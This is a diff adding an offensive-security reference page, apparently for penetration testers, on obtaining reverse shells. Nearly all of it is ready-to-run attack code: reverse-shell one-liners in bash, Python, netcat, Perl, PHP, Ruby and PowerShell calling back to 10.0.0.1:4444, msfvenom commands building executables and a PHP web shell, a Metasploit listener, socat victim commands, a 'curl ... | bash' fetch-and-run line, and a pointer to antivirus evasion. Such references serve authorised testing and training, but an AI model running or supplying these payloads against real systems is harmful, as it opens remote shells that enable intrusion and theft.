@@ -1,0 +1,168 @@
+---
+title: "Reverse Shells"
+description: "Reference for obtaining reverse shells on Linux and Windows, MSFVenom payloads, upgrading to full TTYs, and online shell generators."
+---
+
+## Overview
+
+Once you have code execution on a target, a reverse shell gives you an interactive command prompt. This page covers techniques for Linux, Windows, MSFVenom, and upgrading limited shells to full TTYs.
+
+## Linux Shells
+
+<AccordionGroup>
+  <Accordion title="Bash">
+    ```bash
+    bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+
+    # URL-encoded for web injection
+    bash+-i+>%26+/dev/tcp/10.0.0.1/4444+0>%261
+    ```
+  </Accordion>
+
+  <Accordion title="Python">
+    ```python
+    python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.0.0.1",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"])'
+    ```
+  </Accordion>
+
+  <Accordion title="Netcat">
+    ```bash
+    # With -e flag (traditional)
+    nc -e /bin/sh 10.0.0.1 4444
+
+    # Without -e (using mkfifo)
+    rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f
+    ```
+  </Accordion>
+
+  <Accordion title="Perl">
+    ```perl
+    perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'
+    ```
+  </Accordion>
+
+  <Accordion title="PHP">
+    ```php
+    php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+    ```
+  </Accordion>
+
+  <Accordion title="Ruby">
+    ```ruby
+    ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Windows Shells
+
+<AccordionGroup>
+  <Accordion title="PowerShell">
+    ```powershell
+    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+    ```
+  </Accordion>
+
+  <Accordion title="Netcat (Windows)">
+    ```bash
+    nc.exe -e cmd.exe 10.0.0.1 4444
+    ```
+  </Accordion>
+
+  <Accordion title="Python (Windows)">
+    ```python
+    python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.0.0.1',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['cmd.exe'])"
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## MSFVenom Payloads
+
+```bash
+# Linux ELF reverse shell
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf
+
+# Windows EXE reverse shell
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > shell.exe
+
+# Windows Meterpreter
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > meter.exe
+
+# PHP web shell
+msfvenom -p php/reverse_php LHOST=10.0.0.1 LPORT=4444 -f raw > shell.php
+
+# ASP reverse shell
+msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f asp > shell.asp
+
+# Python reverse shell
+msfvenom -p cmd/unix/reverse_python LHOST=10.0.0.1 LPORT=4444 -f raw > shell.py
+```
+
+### Metasploit Listener
+
+```bash
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 10.0.0.1
+set LPORT 4444
+run
+```
+
+## Upgrading to a Full TTY
+
+Limited shells (no tab completion, no Ctrl+C, no interactive programs) can be upgraded:
+
+<Steps>
+  <Step title="Spawn a PTY with Python">
+    ```bash
+    python3 -c 'import pty; pty.spawn("/bin/bash")'
+    ```
+  </Step>
+  <Step title="Background the Shell">
+    Press `Ctrl+Z` to background the netcat process.
+  </Step>
+  <Step title="Configure Your Terminal">
+    ```bash
+    stty raw -echo; fg
+    ```
+  </Step>
+  <Step title="Set Terminal Variables">
+    ```bash
+    export TERM=xterm
+    export SHELL=bash
+    stty rows 38 columns 116
+    ```
+  </Step>
+</Steps>
+
+Alternatively, use `socat` for a full TTY directly:
+
+```bash
+# Attacker
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+
+# Victim
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444
+```
+
+## Auto-Generated Shell Resources
+
+<CardGroup cols={2}>
+  <Card title="revshells.com" icon="globe" href="https://www.revshells.com/">
+    Web-based generator for all common reverse shell one-liners with encoding options.
+  </Card>
+  <Card title="reverse-shell.sh" icon="terminal" href="https://reverse-shell.sh/">
+    Simple URL-based shell generator: `curl reverse-shell.sh/10.0.0.1:4444 | bash`
+  </Card>
+  <Card title="shellerator" icon="code" href="https://github.com/ShutdownRepo/shellerator">
+    CLI tool generating bind and reverse shells for multiple languages.
+  </Card>
+  <Card title="xc" icon="bolt" href="https://github.com/xct/xc/">
+    Full-featured reverse shell with file transfer, port forwarding, and SOCKS proxy built-in.
+  </Card>
+</CardGroup>
+
+<Note>
+On Windows you may need AV bypass techniques to prevent your shell payload from being detected. Check the Windows AV Bypass page for methods including encoding, encryption, and custom shellcode loaders.
+</Note>
